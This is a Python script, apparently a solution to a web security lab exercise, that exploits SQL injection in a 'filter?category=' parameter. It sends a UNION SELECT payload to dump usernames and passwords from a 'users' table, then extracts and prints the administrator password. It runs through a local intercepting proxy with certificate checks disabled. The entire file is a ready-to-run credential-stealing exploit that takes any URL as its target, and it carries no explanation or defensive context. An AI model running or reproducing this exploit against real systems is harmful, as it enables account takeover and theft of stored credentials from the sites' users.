import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def exploit(url):
    username = "administrator"
    uri = "filter?category="
    payload = "' union select null, username || '~' || password from users"
    request = requests.get(url + uri + payload, verify=False, proxies=proxies)
    response = request.text
    if "administrator" in response:
        print("[?] searching administrator password...")
        soup = BeautifulSoup(response, 'html.parser')
        result = soup.find(string=re.compile(r".*administrator.*"))
        if result:
            passwd = str(result.split("~")[1])
            print(f"[+] password: {passwd}")
        return True
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f"[!] error: {sys.argv[0]} <url>")
        sys.exit(1)

    print("[?] searching database...")
    if not exploit(url):
        print("[-] status: failed detection")
